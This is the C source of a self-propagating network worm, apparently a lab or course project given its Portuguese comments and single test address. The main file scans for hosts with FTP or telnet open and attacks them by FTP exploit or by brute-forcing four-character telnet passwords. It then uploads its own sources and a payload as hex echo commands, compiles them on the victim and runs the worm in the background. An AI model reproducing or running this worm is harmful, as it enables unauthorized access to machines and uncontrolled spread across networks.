#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netdb.h>

#include "exploit.h"
#include "recon.h"
#include "telnet.h"

#define MAX_CMD_SIZE 2048
#define FILE_UPLOAD_BLOCK_SIZE 48
#define FTP_USERNAME "ftp"
#define FTP_PASSWORD "ftp"
#define TELNET_USERNAME "usuario"

#define MAX(x, y) (((x) > (y)) ? (x) : (y))
#define MIN(x, y) (((x) < (y)) ? (x) : (y))

void scan_callback(uint32_t addr, int ftp_open, int telnet_open);
int run_ftp_exploit(uint32_t addr);
int run_telnet_bruteforce(uint32_t addr);
char bruteforce_get_char(int index);
int propagate(int fd);
int upload_file(int fd, const char *filename, const char *dest);
int command(int fd, const char *str, ...);
int command_bg(int fd, const char *str, ...);

int main(int argc, char *argv[]) {
    // ip_subnet *subnets;
    // int subnet_count;

    // subnet_count = getLocalSubnets(&subnets);
    // scanSubnets(subnets, subnet_count, &scan_callback);

    // FOR TESTING:
    scan_callback(inet_addr("10.2.0.100"), 0, 1);

    exit(EXIT_SUCCESS);
}

void scan_callback(uint32_t addr, int ftp_open, int telnet_open) {
    int fd;

    printf("# Found %s (ftp: %d, telnet: %d), attacking...\n",
        addrToString(addr), ftp_open, telnet_open);

    if (ftp_open && telnet_open) {
        if (rand() % 2)
            fd = run_ftp_exploit(addr);
        else
            fd = run_telnet_bruteforce(addr);
    }
    else if (ftp_open) {
        fd = run_ftp_exploit(addr);
    }
    else if (telnet_open) {
        fd = run_telnet_bruteforce(addr);
    }

    if (fd < 0) {
        fprintf(stderr, "# Failure to execute attack.\n");
        return;
    }

    printf("# Propagating worm...\n");
    if (propagate(fd) != 0) {
        fprintf(stderr, "# Failure to propagate worm.\n");
        return;
    }

    close(fd);
}

int run_ftp_exploit(uint32_t addr) {
    int fd, ret;
    target_t *target = NULL;
    char *banner;

    printf("# Executing FTP exploit...\n");

    fd = ftp_login(addrToString(addr), FTP_USERNAME, FTP_PASSWORD, &banner);
    if (fd <= 0) {
        fprintf(stderr, "Failed to connect (user/pass correct?)\n");
        return -1;
    }

    printf("# Banner: %s\n", (banner == NULL) ? "???" : banner);
    if (target == NULL) {
        target = target_from_banner(banner);
        if (target == NULL) {
            fprintf(stderr, "Failed to get target from banner, aborting...\n");
            return -1;
        }
    }
    printf ("# Target: %s\n", target->desc);

    ret = exploit(fd, target);
    if (ret != 0) {
        return -1;
    }

    return fd;
}

int run_telnet_bruteforce(uint32_t addr) {
    int fd, ret;
    int i, found;
    char c0, c1, c2, c3;
    char pass[5];

    printf("# Executing Telnet bruteforce attack...\n");

    pass[4] = '\0';

    found = 0;
    for (i=0; i<62*62*62*62; i++) {
        pass[0] = bruteforce_get_char(i % 62);
        pass[1] = bruteforce_get_char((i / 62) % 62);
        pass[2] = bruteforce_get_char((i / 62 / 62) % 62);
        pass[3] = bruteforce_get_char((i / 62 / 62 / 62) % 62);

        if ((fd = telnet_login(addrToString(addr), TELNET_USERNAME, pass)) > 0) {
            found = 1;
            printf("# Login sucessful with %s/%s @ %s!\n", TELNET_USERNAME, pass, addrToString(addr));
            break;
        }
    }

    if (!found) {
        close(fd);
        return -1;
    }

    return fd;
}

char bruteforce_get_char(int index){
    char character;

    // valores de 0-9
    if(index >= 0 && index < 10){
        character = 48 + index;
    }
    // valores de A-Z
    else if(index >= 10 && index < 36){
        character = 65 + (index - 10);
    }
    // valores de a-z
    else if(index >= 36 && index < 62){
        character = 97 + (index - 36);
    }
        
    return character;
}

int propagate(int fd) {
    printf("# Cleaning up and preparing...\n");
    if (command(fd, "rm -rf detox") != 0) {
        return -1;
    }
    if (command(fd, "mkdir -p detox") != 0) {
        return -1;
    }
    if (command(fd, "cd detox") != 0) {
        return -1;
    }

    printf("# Uploading payload...");
    if (upload_file(fd, "payload.jpg", "payload.jpg") != 0) {
        return -1;
    }

    printf("# Uploading files... [");
    fflush(stdout);
    printf("main.c,"); fflush(stdout);
    if (upload_file(fd, "main.c", "main.c") != 0) {
        return -1;
    }
    printf("recon.c,"); fflush(stdout);
    if (upload_file(fd, "recon.c", "recon.c") != 0) {
        return -1;
    }
    printf("recon.h,"); fflush(stdout);
    if (upload_file(fd, "recon.h", "recon.h") != 0) {
        return -1;
    }
    printf("exploit.c,"); fflush(stdout);
    if (upload_file(fd, "exploit.c", "exploit.c") != 0) {
        return -1;
    }
    printf("exploit.h,"); fflush(stdout);
    if (upload_file(fd, "exploit.h", "exploit.h") != 0) {
        return -1;
    }
    printf("telnet.c,"); fflush(stdout);
    if (upload_file(fd, "telnet.c", "telnet.c") != 0) {
        return -1;
    }
    printf("telnet.h,"); fflush(stdout);
    if (upload_file(fd, "telnet.h", "telnet.h") != 0) {
        return -1;
    }
    printf("Makefile"); fflush(stdout);
    if (upload_file(fd, "Makefile", "Makefile") != 0) {
        return -1;
    }
    printf("]\n");

    printf("# Compiling...\n");
    if (command(fd, "(make >>/tmp/log 2>&1)") != 0) {
        return -1;
    }

    printf("# Executing...\n");
    if (command_bg(fd, "(./worm >>/tmp/log 2>&1)") != 0) {
        return -1;
    }

    return 0;
}

int upload_file(int fd, const char *filename, const char *dest) {
    FILE *file;
    int size;
    unsigned char *file_buf;
    unsigned char hex_string[256];
    unsigned char hex[8];
    int i, offset;

    file = fopen(filename, "rb");

    if (file < 0) {
        fprintf(stderr, "Falha ao abrir arquivo '%s'.", filename);
        return -1;
    }

    // get the size of the file
    fseek(file, 0, SEEK_END);
    size = ftell(file);
    fseek(file, 0, SEEK_SET);

    // read the entire file into a buffer
    file_buf = (unsigned char*) malloc(size + 1);
    fread((void*) file_buf, size, 1, file);
    fclose(file);

    // clean the file at the remote host
    if (command(fd, "echo -n > %s", dest) != 0) {
        free(file_buf);
        return -1;
    }

    // push the file FILE_UPLOAD_BLOCK_SIZE bytes at a time
    for (i=0; i<size; i+=FILE_UPLOAD_BLOCK_SIZE) {
        // empty hex_string
        hex_string[0] = 0;

        // write hexadecimal bytes to hex_string
        for (offset=0; offset<MIN(FILE_UPLOAD_BLOCK_SIZE, size-i); offset++) {
            sprintf(hex, "\\x%02x", file_buf[i+offset]);
            strcat(hex_string, hex);
        }

        // execute a command to echo the hexadecimal bytes to the dest file
        printf("(echo -n -e '%s' >> %s)\n", hex_string, dest);
        if (command(fd, "(echo -n -e '%s' >> %s)", hex_string, dest) != 0) {
            free(file_buf);
            return -1;
        }
    }

    free(file_buf);
    return 0;
}

int command(int fd, const char *str, ...) {
    char buf[MAX_CMD_SIZE];
    char bufRead[MAX_CMD_SIZE];
    va_list vl;
    int len, ret;

    va_start(vl, str);
    vsnprintf(buf, sizeof(buf), str, vl);
    va_end(vl);

    dprintf(fd, "%s; echo return-$?\n", buf);

    // lê o código de saída do socket
    while (1) {
        if ((len = net_rlinet(fd, bufRead, sizeof(bufRead), 20)) <= 0) {
            return -1;
        }

        bufRead[len] = '\0';

        if (strncmp(bufRead, "return-", 7) == 0) {
            ret = atoi(bufRead + 7);
            return ret;
        }
    }

    return -1;
}

int command_bg(int fd, const char *str, ...) {
    char buf[MAX_CMD_SIZE];
    char bufRead[MAX_CMD_SIZE];
    va_list vl;
    int len, ret;

    va_start(vl, str);
    vsnprintf(buf, sizeof(buf), str, vl);
    va_end(vl);

    dprintf(fd, "%s &; echo return-0\n", buf);

    // lê o código de saída do socket
    while (1) {
        if ((len = net_rlinet(fd, bufRead, sizeof(bufRead), 20)) <= 0) {
            return -1;
        }

        bufRead[len] = '\0';

        if (strncmp(bufRead, "return-", 7) == 0) {
            ret = atoi(bufRead + 7);
            return ret;
        }
    }

    return -1;
}
